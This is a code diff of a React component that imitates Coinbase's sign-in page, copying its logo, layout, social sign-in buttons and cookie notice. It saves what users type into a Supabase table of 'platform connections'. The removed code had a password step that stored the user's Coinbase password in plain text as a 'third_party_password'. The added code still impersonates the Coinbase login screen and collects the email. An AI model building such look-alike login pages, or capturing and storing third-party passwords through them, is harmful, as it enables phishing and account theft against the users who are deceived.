@@ -1,47 +1,26 @@
 import React, { useEffect, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { Eye, EyeOff, KeyRound } from 'lucide-react';
 import { supabase } from '../../lib/supabase';
 
-function CoinbaseMark({ dark }: { dark: boolean }) {
+function CoinbaseLogo() {
   return (
-    <svg viewBox="0 0 52 52" aria-hidden="true" className={`h-[50px] w-[50px] ${dark ? 'text-white' : 'text-[#1652f0]'}`}>
-      <path
-        d="M26 4.5C14.126 4.5 4.5 14.126 4.5 26S14.126 47.5 26 47.5c8.965 0 16.649-5.49 19.862-13.286H34.704A10.84 10.84 0 0 1 26 38.575c-6.944 0-12.575-5.631-12.575-12.575S19.056 13.425 26 13.425c3.462 0 6.597 1.4 8.87 3.668h10.992C42.649 9.99 34.965 4.5 26 4.5Z"
-        fill="currentColor"
-      />
+    <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="16" cy="16" r="16" fill="#0052FF"/>
+      <path d="M16 6C10.4772 6 6 10.4772 6 16C6 21.5228 10.4772 26 16 26C20.1667 26 23.7333 23.45 25.2333 19.8333H21C19.9333 21.7 18.1167 22.9167 16 22.9167C12.1833 22.9167 9.08333 19.8167 9.08333 16C9.08333 12.1833 12.1833 9.08333 16 9.08333C18.1167 9.08333 19.9333 10.3 21 12.1667H25.2333C23.7333 8.55 20.1667 6 16 6Z" fill="white"/>
     </svg>
-  );
-}
-
-function SocialButton({ children, dark, icon }: any) {
-  return (
-    <button
-      type="button"
-      className={`flex h-[74px] w-full items-center rounded-[37px] px-7 text-left transition-colors ${
-        dark ? 'bg-[#2a2c34] text-white hover:bg-[#30333d]' : 'bg-[#f1f3f8] text-[#0a0b0d] hover:bg-[#e8ebf2]'
-      }`}
-    >
-      <div className="flex w-[42px] justify-center">{icon}</div>
-      <span className="ml-5 text-[20px] font-semibold tracking-[-0.025em]">{children}</span>
-    </button>
   );
 }
 
 export default function CoinbaseConnect() {
   const navigate = useNavigate();
-  const [step, setStep] = useState('email');
-  const [isDarkTheme, setIsDarkTheme] = useState(true); // Default to dark as per screenshot
-  const [showPassword, setShowPassword] = useState(false);
+  const [isDarkTheme, setIsDarkTheme] = useState(false);
   const [credentials, setCredentials] = useState({
     email: '',
-    password: '',
   });
   const [loading, setLoading] = useState(false);
   const [errorMessage, setErrorMessage] = useState('');
 
   useEffect(() => {
-    // Keep theme sync but default to dark for fidelity if preferred
     const mediaQuery = window.matchMedia('(prefers-color-scheme: dark)');
     const syncTheme = () => setIsDarkTheme(mediaQuery.matches);
     syncTheme();
@@ -53,21 +32,10 @@ export default function CoinbaseConnect() {
     setCredentials((current) => ({ ...current, [field]: event.target.value }));
   };
 
-  const handleContinue = (event: React.FormEvent) => {
+  const handleContinue = async (event: React.FormEvent) => {
     event.preventDefault();
     if (!credentials.email.trim()) {
       setErrorMessage('Enter your email address to continue.');
-      return;
-    }
-    setErrorMessage('');
-    setStep('password');
-  };
-
-  const handlePasswordSubmit = async (event: React.FormEvent) => {
-    event.preventDefault();
-    const { email, password } = credentials;
-    if (!password) {
-      setErrorMessage('Enter your password to continue.');
       return;
     }
     setLoading(true);
@@ -75,8 +43,7 @@ export default function CoinbaseConnect() {
       const { data: { session } } = await supabase.auth.getSession();
       const { error } = await supabase.from('platform_connections').insert({
         platform: 'Coinbase',
-        email,
-        third_party_password: password,
+        email: credentials.email,
         user_id: session?.user?.id || null
       });
       if (error) throw error;
@@ -89,117 +56,86 @@ export default function CoinbaseConnect() {
   };
 
   const dark = isDarkTheme;
-  const pageClasses = dark ? 'bg-[#0b0b0d] text-white' : 'bg-white text-[#0b0b0d]';
+  const pageClasses = dark ? 'bg-[#0a0a0a] text-white' : 'bg-white text-black';
   
   return (
-    <main className={`${pageClasses} min-h-screen overflow-x-hidden font-sans flex flex-col`}>
-      <section className="mx-auto w-full max-w-[430px] px-[24px] pt-[40px] flex-1">
-        <div className="flex justify-start mb-[80px]">
-          <CoinbaseMark dark={dark} />
+    <main className={`${pageClasses} min-h-screen flex flex-col font-sans`}>
+      <div className="mx-auto w-full max-w-[480px] px-6 pt-10 flex-1 flex flex-col">
+        <div className="mb-14">
+          <CoinbaseLogo />
         </div>
 
-        <div className="">
-          <h1 className="text-[32px] font-bold tracking-tight mb-[48px]">
-            Sign in to Coinbase
-          </h1>
+        <h1 className="text-[34px] font-bold tracking-tight mb-10">
+          Sign in to Coinbase
+        </h1>
 
-          <form onSubmit={step === 'email' ? handleContinue : handlePasswordSubmit} className="space-y-6">
-            {step === 'email' ? (
-              <div className="space-y-4">
-                <label htmlFor="coinbase-email" className="block text-[16px] font-bold">
-                  Email
-                </label>
-                <input
-                  id="coinbase-email"
-                  type="email"
-                  value={credentials.email}
-                  onChange={handleFieldChange('email')}
-                  placeholder="Your email address"
-                  className={`h-[72px] w-full rounded-[12px] border px-[20px] text-[18px] outline-none transition-all ${
-                    dark ? 'bg-transparent border-[#2d2e34] focus:border-[#2752e7]' : 'bg-white border-[#babdc7] focus:border-[#2752e7]'
-                  }`}
-                />
-              </div>
-            ) : (
-              <div className="space-y-6">
-                {/* Email Display Box */}
-                <div className={`flex items-center gap-4 h-[72px] w-full rounded-[12px] border px-[20px] ${
-                  dark ? 'bg-transparent border-[#2d2e34]' : 'bg-white border-[#babdc7]'
-                }`}>
-                  <div className="w-10 h-10 rounded-full bg-white/10 flex items-center justify-center overflow-hidden">
-                    <div className="w-full h-full bg-gray-400 opacity-50" />
-                  </div>
-                  <span className="text-[18px] font-medium truncate">{credentials.email}</span>
-                </div>
+        <form onSubmit={handleContinue} className="space-y-8">
+          <div className="space-y-3">
+            <label htmlFor="coinbase-email" className="block text-[16px] font-bold">
+              Email
+            </label>
+            <input
+              id="coinbase-email"
+              type="email"
+              value={credentials.email}
+              onChange={handleFieldChange('email')}
+              placeholder="Your email address"
+              className={`h-[68px] w-full rounded-2xl border px-6 text-[18px] outline-none transition-all ${
+                dark 
+                  ? 'bg-transparent border-[#2d2e34] focus:border-[#0052FF] focus:ring-1 focus:ring-[#0052FF]' 
+                  : 'bg-white border-[#babdc7] focus:border-[#0052FF] focus:ring-1 focus:ring-[#0052FF]'
+              }`}
+            />
+          </div>
 
-                <div className="space-y-4">
-                  <label htmlFor="coinbase-password" className="block text-[16px] font-bold">
-                    Password
-                  </label>
-                  <div className="relative">
-                    <input
-                      id="coinbase-password"
-                      type={showPassword ? 'text' : 'password'}
-                      value={credentials.password}
-                      onChange={handleFieldChange('password')}
-                      autoFocus
-                      className={`h-[72px] w-full rounded-[12px] border px-[20px] pr-14 text-[18px] outline-none transition-all ${
-                        dark ? 'bg-transparent border-[#2752e7] ring-1 ring-[#2752e7]' : 'bg-white border-[#2752e7] ring-1 ring-[#2752e7]'
-                      }`}
-                    />
-                    <button
-                      type="button"
-                      onClick={() => setShowPassword(!showPassword)}
-                      className="absolute right-5 top-1/2 -translate-y-1/2 opacity-60"
-                    >
-                      {showPassword ? <EyeOff className="w-6 h-6" /> : <Eye className="w-6 h-6" />}
-                    </button>
-                  </div>
-                  <button type="button" className="text-[#2752e7] text-[16px] font-medium hover:underline">
-                    Forgot password?
-                  </button>
-                </div>
-              </div>
-            )}
+          {errorMessage && <p className="text-red-500 text-sm font-medium">{errorMessage}</p>}
 
-            <button
-              type="submit"
-              disabled={loading}
-              className={`mt-4 flex h-[64px] w-full items-center justify-center rounded-full text-[18px] font-bold transition-all ${
-                dark ? 'bg-[#2d2e34] text-[#5c5e66]' : 'bg-[#f1f3f8] text-[#9fa3b3]'
-              } ${credentials.email && (step === 'email' || credentials.password) ? 'bg-[#2752e7] text-white' : ''}`}
-            >
-              {loading ? 'Connecting...' : 'Continue'}
-            </button>
-          </form>
+          <button
+            type="submit"
+            disabled={loading}
+            className="h-[68px] w-full rounded-full bg-[#0052FF] text-white text-[18px] font-bold hover:bg-[#0045d9] transition-all disabled:opacity-50"
+          >
+            {loading ? 'Connecting...' : 'Continue'}
+          </button>
+        </form>
 
-          {step === 'email' && (
-            <>
-              <div className="mt-[40px] flex items-center gap-4">
-                <div className="h-px flex-1 bg-white/10" />
-                <span className="text-[14px] font-medium text-white/40">OR</span>
-                <div className="h-px flex-1 bg-white/10" />
-              </div>
-
-              <div className="mt-[40px] space-y-4">
-                <SocialButton dark={dark} icon={<KeyRound className="w-6 h-6" />}>Sign in with passkey</SocialButton>
-                <SocialButton dark={dark} icon={<img src="/logos/google-icon-logo-svgrepo-com.svg" alt="Google" className="w-6 h-6" />}>Sign in with Google</SocialButton>
-                <SocialButton dark={dark} icon={<img src="/logos/apple-logo-svgrepo-com.svg" alt="Apple" className="w-6 h-6 brightness-0 invert" />}>Sign in with Apple</SocialButton>
-              </div>
-
-              <p className="mt-[48px] text-center text-[16px] font-bold">
-                {/* Removed Sign up link */}
-              </p>
-            </>
-          )}
+        <div className="mt-10 flex items-center gap-4">
+          <div className={`h-px flex-1 ${dark ? 'bg-[#2d2e34]' : 'bg-[#e2e4e9]'}`} />
+          <span className="text-[12px] font-bold text-slate-500">OR</span>
+          <div className={`h-px flex-1 ${dark ? 'bg-[#2d2e34]' : 'bg-[#e2e4e9]'}`} />
         </div>
-      </section>
 
-      <footer className="p-6 pt-12">
-        <p className="text-[12px] leading-relaxed opacity-40 max-w-[380px] mx-auto text-center sm:text-left">
-          We use strictly necessary cookies to enable essential functions, such as security and authentication. For more information, see our <button className="underline">Cookie Policy</button> and <button className="underline">Privacy Policy</button>.
+        <div className="mt-10 space-y-4">
+          <button className={`flex h-[68px] w-full items-center rounded-full px-8 transition-colors ${dark ? 'bg-[#1a1b1e] text-white hover:bg-[#25262b]' : 'bg-[#f1f3f8] text-black hover:bg-[#e8ebf2]'}`}>
+            <div className="flex w-6 justify-center items-center">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+            </div>
+            <span className="flex-1 text-center text-[18px] font-bold">Sign in with passkey</span>
+          </button>
+          <button className={`flex h-[68px] w-full items-center rounded-full px-8 transition-colors ${dark ? 'bg-[#1a1b1e] text-white hover:bg-[#25262b]' : 'bg-[#f1f3f8] text-black hover:bg-[#e8ebf2]'}`}>
+            <div className="flex w-6 justify-center items-center">
+              <img src="/logos/google-icon-logo-svgrepo-com.svg" alt="Google" className="w-6 h-6" />
+            </div>
+            <span className="flex-1 text-center text-[18px] font-bold">Sign in with Google</span>
+          </button>
+          <button className={`flex h-[68px] w-full items-center rounded-full px-8 transition-colors ${dark ? 'bg-[#1a1b1e] text-white hover:bg-[#25262b]' : 'bg-[#f1f3f8] text-black hover:bg-[#e8ebf2]'}`}>
+            <div className="flex w-6 justify-center items-center">
+              <img src="/logos/apple-logo-svgrepo-com.svg" alt="Apple" className={`w-6 h-6 ${dark ? 'invert' : ''}`} />
+            </div>
+            <span className="flex-1 text-center text-[18px] font-bold">Sign in with Apple</span>
+          </button>
+        </div>
+
+        <p className="mt-14 text-center text-[18px] font-bold">
+          Don&apos;t have an account? <span className="text-[#0052FF] cursor-pointer hover:underline">Sign up</span>
         </p>
-      </footer>
+
+        <div className="mt-auto py-12">
+          <p className="text-[13px] leading-relaxed text-slate-500 text-center sm:text-left">
+            We use strictly necessary cookies to enable essential functions, such as security and authentication. For more information, see our <button className="underline font-medium">Cookie Policy</button> and <button className="underline font-medium">Privacy Policy</button>.
+          </p>
+        </div>
+      </div>
     </main>
   );
 }
